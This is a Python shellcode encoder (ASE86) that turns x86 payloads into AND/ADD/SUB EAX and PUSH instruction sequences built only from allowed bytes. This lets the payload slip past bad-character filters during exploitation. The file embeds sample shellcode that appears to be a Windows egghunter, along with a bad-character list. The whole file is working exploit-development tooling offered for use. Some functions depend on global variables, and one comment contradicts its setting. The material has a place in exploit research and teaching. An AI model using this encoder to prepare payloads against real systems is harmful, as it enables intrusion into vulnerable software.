#!/usr/bin/python3

# ASE86 - An ADD/SUB Encoder for x86 shellcode
# By Michael W. Norris
# https://github.com/norrismw/exploit-dev/blob/master/ASEncoder86/ASE86.py

import struct, sys, random


class AddSubEncoder86: # subtract = True in the following example

    def __init__(self, bad_chars, shellcode): # initializes local variables
        self.bad_chars = bad_chars # bad bytes/characters
        self.shellcode = shellcode # shellcode to be encoded
        self.values = [v for v in range(256)] # all byte values
        self.all_bytes = b''.join([bytes([b]) for b in self.values]) # string of all bytes
        self.allowed_chars = [b for b in self.all_bytes if b not in self.bad_chars] # allowed bytes/characters

    def zero_register(self):
        while True:
            two_bytes = random.sample(self.allowed_chars, k=2)
            if two_bytes[0] & two_bytes[1] == 0:
                list_one = [two_bytes[0] for i in range(4)]
                list_two = [two_bytes[1] for i in range(4)]
                return [list_one, list_two]

    def chunk_shellcode(self): # divides shellcode into 4 byte chunks, padding with NOP (\x90) bytes if necessary
        if not len(self.shellcode) % 4 == 0: # if the length of the shellcode isn't evenly divisible by 4
            for i in range(4 - ((len(shellcode) % 4))): # determines how many NOP bytes to add ...
                self.shellcode.append(144) #  e.g. if len(shellcode) is 31, then 4 - (31 % 4) = 1, so 1 NOP byte \x90 (144) will be appended to the shellcode
        return [self.shellcode[i:i+4] for i in range(0, len(self.shellcode), 4)] # divides shellcode into 4 byte chunks; e.g. if len(shellcode) is 8, [bytearray(b'\xe7\xff\xe7u'), bytearray(b'\xaf\xeau\xaf')]

    def target_value(self, four_bytes): # subtract = True; \xe7\xff\xe7\x75
        operand = [b for b in four_bytes] # \xe7\xff\xe7\x75 -> [231, 255, 231, 117]
        if subtract: # if subtract = True, use SUB EAX byte math instead of ADD EAX byte math
            input_one = 4294967294 # base 10 integer value of \xff\xff\xff\xfe
            input_two = struct.unpack('>I', bytearray(operand))[0] # base 10 integer value of bl; \xe7\xff\xe7\x75 -> 3892307829
            operand = [b for b in (input_one ^ input_two).to_bytes(4, 'big')] # \xff\xff\xff\xfe) XOR \xe7\xff\xe7\x75 = \x18\x00\x18\x8b -> [24, 0, 24, 139]
        return operand # returns operand list based on 'subtract' boolean; e.g. [231, 255, 231, 117] if subtract = False or [24, 0, 24, 139] if subtract = True

    def check_carry(self, four_bytes, t): # subtract = True; \x18\x00\x18\x8b = [24, 0, 24, 139]; subtract 1 (0x01) from the left when adding to/beyond 256 (0x0100)
        reverse = four_bytes[::-1] # reverses [24, 0, 24, 139] to [139, 24, 0, 24]; consider bytes in this order to account for cascading arithmetic
        for i in range(t): # accounts for [139, 24, 0] (no position to the left of the most significant '24' byte, so ignore)
            if reverse[i] < min(self.allowed_chars) * t: # if true, must add to/beyond 256 (0x0100) to reach byte value; True for '0' (must add to 256) at index 2
                    reverse[i+1] -= 1 # subtracts 1 (0x01) from '24' at index 3 ([139, 24, 0, 23]) to account for the 0x0100 carry
        return reverse[::-1] # revert to original byte order [23, 0, 24, 139]

    def brute_addition(self, n, t): # finds three allowed bytes/character values that add to a bad byte/character value
        if n < min(self.allowed_chars) * t: # can't add three numbers to n when n is less than three times the lowest value allowed character ...
            n += 256 # so add three numbers to n + 256; n + 256 = 0x010n, so normalize for carry
        if t == 2:
            all_pairs = [element for element in ((x,y) for x in self.allowed_chars for y in self.allowed_chars)]
            for pair in all_pairs: # considers all combinations
                if sum(pair) == n: # check if the two allowed bytes add to n;
                    return pair # return pair; e.g. n = 24, could return (10, 14)
        elif t == 3:
            while True: # never give up. never surrender.
                selected_bytes = random.choices(self.allowed_chars, k=3) # pick three bytes from allowed characters; allows for duplicate bytes to be selected
                if sum(selected_bytes) == n: # check if the three random allowed bytes add to n;
                    return selected_bytes # return selected_bytes; e.g. n = 24, could return [9, 6, 9]


def main():
    encoder = AddSubEncoder86(bad_chars, shellcode)
    forward_chunks = encoder.chunk_shellcode() # breaks shellcode into chunks of 4; first 4 bytes are at index 0
    code_chunks = [chunk[::-1] for chunk in forward_chunks[::-1]] # e.g. forward_chunks[-1] is code_chunks[0], and forward_chunks[-1][-1] is code_chunks[0][0]
    raw_targets = [encoder.target_value(chunk) for chunk in code_chunks] # list of four byte target values generated by AddSubEncoder86.target_value()
    two_targets = [encoder.check_carry(raw_targets[i], 2) for i in range(len(raw_targets))] # list of four two-value tuples that each add to target value, adjusted to account for adding to/beyond 256 (0x0100)
    three_targets = [encoder.check_carry(raw_targets[i], 3) for i in range(len(raw_targets))] # list of four three-value lists that each add to target value, adjusted to account for adding to/beyond 256 (0x0100)
    all_hexvalues = list()
    for loop_num in range(len(code_chunks)): # iterates over each chunk of 4 byte shellcode; e.g. \xe7\xff\xe7\x75
        zero_bytes = encoder.zero_register() # list of two four-byte lists that will zero a register; e.g. [[98, 98, 98, 98], [12, 12, 12, 12]]
        two_operands = [encoder.brute_addition(two_targets[loop_num][i], 2) for i in range(4)] # attempts to add all possible pairs of allowed byte values to reach target byte values
        three_operands = [encoder.brute_addition(three_targets[loop_num][i], 3) for i in range(4)] # attempts to add three random allowed byte values to reach target byte values
        operands = three_operands if None in two_operands else two_operands # if all byte targets can be rached with two operands, then None will not be in list of tuples
        bytevalues = list()
        for index in range(len(operands[0])):
            bytevalues.append([operands[b][index] for b in range(4)]) # byte value of an ADD operand; e.g. [15, 72, 104, 108]
        zero_one = ''.join(['%02x' % b for b in zero_bytes[0]]) # string of hex value of each byte in zero_bytes[0]; e.g. [98, 98, 98, 98] -> '62626262'
        zero_two = ''.join(['%02x' % b for b in zero_bytes[1]]) # string of hex value of each byte in zero_bytes[1]]; e.g. [12, 12, 12, 12] -> '0c0c0c0c'
        hexvalues = list()
        hexvalues.append(clear_method+zero_one+clear_method+zero_two) # e.g. 2562626262250c0c0c0c for 'AND EAX,62626262#AND EAX,0c0c0c0c'
        for index in range(len(bytevalues)):
            hexvalues.append(operator) # e.g. 2d or 05 for 'ADD EAX,' or 'SUB EAX,'
            hexvalues.append(['%02x' % b for b in bytevalues[index]]) # e.g. ADD EAX,0f48686c#ADD EAX,4b4c7ca5#ADD EAX,1b531b30
        hexvalues.append(push) # e.g. 50 for 'PUSH EAX'
        all_hexvalues.append([hexv for hchunk in hexvalues for hexv in hchunk]) # flatten hexvalues indices into an index in all_hexvalues
        raw_format = ''.join([hexv for hchunk in all_hexvalues for hexv in hchunk]) # print string of flattened all_hexvalues indices
        python_format = '\\x'+'\\x'.join([raw_format[i:i+2] for i in range(0, len(raw_format), 2)])
    return python_format if python else raw_format


if __name__ == '__main__':
    
    # Configurable variables
    bad_chars = bytearray(b'\x00\x0a\x0d\x2f\x3a\x3f\x40\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')
    shellcode = bytearray(b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7')
    
    binary = True # True for '0506016404' or '2d06016404' binary paste style instructions; False for 'ADD EAX,04640106' or 'SUB EAX,04640106' style assembly instructions
    subtract = False # True for SUB, False for ADD; e.g. select False if encoded bytes will be added to a register or True if encoded bytes will be subtracted from a register
    python = False # True for python formatted output like '\x25\x5a\x5a\x5a\x5a\x25\x01\x01\x01\x01' or False for raw output like 255a5a5a5a2501010101
    
    # +------+-----+------+------+------+------+------+
    # | +--+ | EAX | ECX  | EDX  | EBX  | ESI  | EDI  |
    # +------+-----+------+------+------+------+------+
    # | AND  | 25  | 81e1 | 81e2 | 81e3 | 81e6 | 81e7 |
    # | ADD  | 05  | 81c1 | 81c2 | 81c3 | 81c6 | 81c7 |
    # | SUB  | 2d  | 81e9 | 81ea | 81eb | 81ee | 81ef |
    # | PUSH | 50  | 51   | 52   | 53   | 56   | 57   |
    # | POP  | 58  | 59   | 5a   | 5b   | 5e   | 5f   |
    # +------+-----+------+------+------+------+------+
    
    clear_method = '25' # opcode for AND EAX; adjust for registers other than EAX accordingly
    operator = '2d' if subtract else '05' # opcodes for SUB EAX and ADD EAX; adjust for registers other than EAX accordingly
    push = '50' # opcode for PUSH EAX; adjust for registers other than EAX accordingly

    # Run
    encoded = main()
    print(encoded)
